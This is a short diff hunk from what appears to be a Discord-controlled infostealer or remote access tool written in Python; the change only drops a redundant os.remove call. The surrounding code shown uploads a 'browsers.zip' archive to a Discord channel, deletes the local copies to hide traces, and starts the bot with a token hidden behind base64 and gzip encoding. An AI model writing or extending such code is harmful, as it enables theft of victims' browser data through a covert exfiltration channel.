@@ -518,6 +518,5 @@ async def on_message(message):
         await message.channel.send(file=discord.File(f"{main_path}\\browsers.zip"))
         files.delete_dir(f"{main_path}\\browsers")
         files.delete_file(f"{main_path}\\browsers.zip")
-        os.remove(f"{main_path}\\browsers")
         
 client.run(gzip.decompress(base64.b64decode(reg_h.get_token())).decode("utf-8"))
